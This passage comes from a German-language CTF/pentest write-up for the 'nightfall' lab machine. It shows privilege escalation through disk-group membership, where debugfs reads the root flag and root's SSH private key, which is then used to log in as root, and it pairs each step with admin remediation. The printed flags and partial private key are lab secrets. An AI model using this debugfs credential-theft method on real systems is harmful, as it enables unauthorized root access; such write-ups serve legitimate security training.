+<span class="command">U2FsdGVkX1+s5zqP533uCKtFYoSEEU41j01PSMGlBMiJ2v7ksXTzgHC5Dx2Nzc/uc0RZ6jLviSy</span>
+<span class="command">[... Derselbe Base64-Blob wie zuvor ...]</span>
+<span class="command">dQRH9RQtj7tSHyvDNxX60Y46W/rEd7p7Y/cUeRnu/SRwHtkI2jmj2prA</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `abraham` wird versucht, `sudo -l` auszuführen, was fehlschlägt, da `sudo` nicht im Pfad ist oder nicht installiert ist. Die Datei `user.txt` wird gefunden und enthält die User-Flag. Die Datei `door.txt` enthält denselben verschlüsselten Base64-Blob, der bereits über UDP empfangen wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `abraham` hat keine `sudo`-Rechte. Die User-Flag wurde gefunden. Die Datei `door.txt` liefert keine neuen Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Eskalationsvektoren: SUID/SGID-Binaries, Kernel-Exploits (Version prüfen!), Fehlkonfigurationen von Diensten, schreibbare sensible Dateien/Verzeichnisse, Cronjobs.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+        </section>
+
+       <section id="poc">
+            <h2>Proof of Concept: Privilege Escalation via debugfs (Disk Group Membership)</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `abraham` ist Mitglied der Systemgruppe `disk`. Diese Gruppenzugehörigkeit gewährt oft direkten Lese- und Schreibzugriff auf Block-Devices (Festplattenpartitionen) wie `/dev/sda1`. Das Werkzeug `debugfs` ist ein Dateisystem-Debugger für ext2/ext3/ext4-Dateisysteme, der es ermöglicht, direkt mit dem Dateisystem auf einem Block-Device zu interagieren, *ohne* die normalen Dateisystemberechtigungen des Betriebssystems zu berücksichtigen. Indem `debugfs` im Schreibmodus (`-w`) auf das Root-Dateisystem (`/dev/sda1`) angewendet wird, kann ein Benutzer mit `disk`-Gruppenrechten beliebige Dateien auf diesem Dateisystem lesen oder sogar modifizieren, selbst wenn er als normaler Benutzer keine Leserechte hätte. Dies schließt sensible Dateien wie `/root/root.txt` oder `/root/.ssh/id_rsa` ein.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Shell-Zugriff als Benutzer, der Mitglied der Gruppe `disk` ist (hier `abraham`).</li>
+                    <li>Das Werkzeug `debugfs` muss auf dem System installiert sein (Teil von `e2fsprogs`).</li>
+                    <li>Das Root-Dateisystem muss ein Typ sein, den `debugfs` unterstützt (ext2/3/4).</li>
+                    <li>Kenntnis des Block-Devices für das Root-Dateisystem (oft `/dev/sda1` oder `/dev/vda1`).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>
+                        <strong>Gruppenzugehörigkeit prüfen:</strong>
+                        Als Benutzer `abraham` die Gruppenzugehörigkeit prüfen:
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">abraham@nightfall:~$ <span class="command">id</span></div>
+                                <pre><span class="command">uid=1000(abraham) gid=6(disk) groups=6(disk)</span></pre>
+                            </div>
+                        </div>
+                        <p class="evaluation">Bestätigt, dass `abraham` Mitglied der Gruppe `disk` ist.</p>
+                    </li>
+                    <li>
+                        <strong>Root-Dateisystem-Device identifizieren:</strong>
+                        (Nicht im Log gezeigt, aber oft durch `df -h` oder `lsblk` möglich). Annahme: `/dev/sda1`.
+                    </li>
+                    <li>
+                        <strong>`debugfs` starten:</strong>
+                        Starten Sie `debugfs` im Schreibmodus für das Root-Device:
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">abraham@nightfall:~$ <span class="command">/usr/sbin/debugfs -w /dev/sda1</span></div>
+                                <pre>debugfs 1.44.5 (15-Dec-2018)
+debugfs:  </pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Sensible Dateien lesen:</strong>
+                        Innerhalb der `debugfs`-Shell können nun Befehle wie `cat` verwendet werden, um Dateien zu lesen, auf die `abraham` normalerweise keinen Zugriff hätte:
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">debugfs: <span class="command">cat /root/root.txt</span></div>
+                                <pre><span class="password">3aa982dd7e61dd66d116dea033e10dc7</span></pre>
+                                <div class="prompt">debugfs: <span class="command">cat /root/.ssh/id_rsa</span></div>
+                                <pre><span class="password">-----BEGIN RSA PRIVATE KEY-----
+[...]
+-----END RSA PRIVATE KEY-----</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>`debugfs` beenden:</strong>
+                         Mit `quit` oder Strg+D.
+                    </li>
+                     <li>
+                        <strong>SSH als Root (nach Key-Extraktion):</strong>
+                         Speichern Sie den extrahierten Root-SSH-Schlüssel auf dem Angreifer-System, setzen Sie die Berechtigungen und melden Sie sich als `root` an.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i rootrsa root@192.168.2.110</span></div>
+                                <pre>[...]
+root@nightfall:~# <span class="password"># Root-Zugriff</span></pre>
+                             </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Fähigkeit, beliebige Dateien auf dem Root-Dateisystem zu lesen und potenziell zu schreiben, was zur Extraktion von Root-Credentials (SSH-Key) und somit zur vollständigen Systemübernahme führt.</p>
+
+            <p class="evaluation"><strong>Beweismittel:</strong> Der erfolgreich aus `debugfs` ausgelesene Inhalt von `/root/root.txt` und `/root/.ssh/id_rsa`, sowie der anschließende erfolgreiche SSH-Login als `root`.</p>
+
+            <p class="recommendation"><strong>Risikobewertung:</strong> Sehr Hoch. Die Mitgliedschaft in der `disk`-Gruppe ist quasi gleichbedeutend mit Root-Rechten auf vielen Systemen, da sie den direkten Zugriff auf Dateisystemdaten ermöglicht und Betriebssystem-Berechtigungen umgeht.</p>
+
+            <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                    <li>**Gruppenmitgliedschaften überprüfen:** Entfernen Sie Benutzer aus der `disk`-Gruppe (und ähnlichen Gruppen wie `adm`, `kmem`), es sei denn, es ist absolut und nachweislich notwendig.</li>
+                    <li>**Tool-Zugriff einschränken:** Beschränken Sie den Zugriff auf Low-Level-Tools wie `debugfs`, wenn möglich, obwohl dies schwierig ist, wenn die Gruppenzugehörigkeit bereits den Zugriff auf die Devices erlaubt.</li>
+                    <li>**Festplattenverschlüsselung:** Vollständige Festplattenverschlüsselung (z.B. LUKS) kann den Offline-Zugriff auf die Daten erschweren, hilft aber nicht gegen diesen Online-Angriff durch ein Mitglied der `disk`-Gruppe.</li>
+                    <li>**Least Privilege:** Weisen Sie Benutzern und Gruppen immer nur die minimal notwendigen Berechtigungen zu.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">abraham@nightfall:~$ <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(abraham) gid=6(disk) groups=6(disk)</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl wird ausgeführt, um die Benutzer-, Gruppen- und Gruppenzugehörigkeiten des aktuellen Benutzers (`abraham`) anzuzeigen. Entscheidend ist die Mitgliedschaft in der Gruppe `disk` (gid=6).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Schlüssel zur Privilege Escalation. Die Mitgliedschaft in der `disk`-Gruppe erlaubt oft direkten Zugriff auf Block-Devices (Festplattenpartitionen).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie Tools wie `debugfs`, um auf das Dateisystem des Root-Devices (z.B. `/dev/sda1`) zuzugreifen und sensible Dateien direkt zu lesen, wobei die normalen Dateisystemberechtigungen umgangen werden.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie Benutzer aus der `disk`-Gruppe, wenn sie diese Rechte nicht zwingend benötigen. Diese Gruppe gewährt extrem hohe Privilegien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">abraham@nightfall:~$ <span class="command">/usr/sbin/debugfs -w /dev/sda1</span></div>
+                    <pre>debugfs 1.44.5 (15-Dec-2018)
+debugfs:  </pre>
+                     <div class="prompt">debugfs: <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">3aa982dd7e61dd66d116dea033e10dc7</span></pre>
+                     <div class="prompt">debugfs: <span class="command">cat /root/.ssh/id_rsa</span></div>
+                     <pre>
+<span class="password">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="password">MIIEogIBAAKCAQEA3ZsawoC8ZaohGH0R0N1daXr/HtLB1kvtFQlUL93Sy9WLBa</span>
+<span class="password">[...]</span>
+<span class="password">gnk57/z5ifJLq8MAdpIgfQKBgAPkmmcu6LYQyBUF7/pRE4/Kg4re+R0/XmqEmkit</span>
+<span class="password">[...]</span>
+<span class="password">Vwp3AoGAbYEphZrDroZr0SvejqlwMVGbuoYav66Tz/Y3Lp8l/71P3l3ldxU4B+</span>
+<span class="password">XXVwqgbXMdwnDJ2+zj1Gp/ZQWgm9iKoZJeByk1zg3c2V8Xq3xF0=</span>
+<span class="password">-----END RSA PRIVATE KEY-----</span>
+</pre>
+                     <div class="prompt">debugfs: <span class="command">quit</span></div> <span class="password"><-- Impliziertes Beenden</span>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Da `abraham` Mitglied der `disk`-Gruppe ist, kann er `debugfs` im Schreibmodus (`-w`) auf das erste Device (`/dev/sda1`, vermutlich das Root-Dateisystem) starten. Innerhalb von `debugfs` werden die normalen Dateisystemberechtigungen umgangen. Mit dem `cat`-Befehl von `debugfs` können die Root-Flag (`/root/root.txt`) und, noch wichtiger, der private SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_rsa`) gelesen werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Privilege Escalation durch Ausnutzung der `disk`-Gruppenmitgliedschaft. Der private SSH-Schlüssel des Root-Benutzers wurde kompromittiert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den privaten Root-SSH-Schlüssel, speichern Sie ihn auf Ihrem Angreifer-System, setzen Sie die korrekten Berechtigungen (`chmod 600`) und verwenden Sie ihn, um sich als `root` via SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie `abraham` (und andere nicht administrative Benutzer) aus der `disk`-Gruppe. Überprüfen Sie alle Gruppenmitgliedschaften auf übermäßige Berechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">mv ssh_rsa ~</span></div> <span class="password"><-- Unklar, warum dieser Key verschoben wird, vermutlich Verwechslung</span>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">nano rootrsa</span></div>
+                     <pre>[Editor geöffnet, Root-Key aus debugfs eingefügt und gespeichert]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">chmod 600 rootrsa</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird der über `debugfs` extrahierte Root-SSH-Schlüssel in eine Datei namens `rootrsa` gespeichert. Die Berechtigungen werden mit `chmod 600` korrekt gesetzt. (Der `mv ssh_rsa ~`-Befehl scheint hier fehl am Platz zu sein und bezieht sich wahrscheinlich auf den vorherigen Schlüssel von `abraham`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der kompromittierte Root-Schlüssel ist nun für den SSH-Login vorbereitet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Schlüssel `rootrsa`, um sich als `root` via SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, außer der Behebung der Ursache (disk group).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">ssh -i rootrsa root@192.168.2.110</span></div>
+                    <pre>
+The authenticity of host '192.168.2.110 (192.168.2.110)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '192.168.2.110' (ED25519) to the list of known hosts.
+Last login: Sun Jun 20 11:42:37 2021 from 192.168.0.28
+root@nightfall:~# <span class="command">id</span> <span class="password"><-- Zusätzlicher Befehl zur Bestätigung</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+root@nightfall:~# <span class="password"># Root-Zugriff erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Befehl `ssh -i rootrsa root@192.168.2.110` meldet sich der Angreifer als Benutzer `root` am Zielsystem an und verwendet dabei den zuvor über `debugfs` extrahierten privaten Schlüssel. Der Login ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Voller Root-Zugriff auf das System wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Ggf. Aufräumarbeiten durchführen oder Persistenz einrichten (im Rahmen des Auftrags). Bericht fertigstellen.<br><strong>Empfehlung (Admin):</strong> Widerrufen Sie den kompromittierten Root-SSH-Schlüssel. Beheben Sie die Schwachstelle (Mitgliedschaft in `disk`-Gruppe). Führen Sie eine vollständige Systemprüfung auf weitere Kompromittierungen durch.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">c02546146dfcf2bec351c4fece2dec21</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">3aa982dd7e61dd66d116dea033e10dc7</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. November 2022</p> <!-- Korrektes Datum aus Nmap extrahiert -->
+    </footer>
+</body>
+</html>
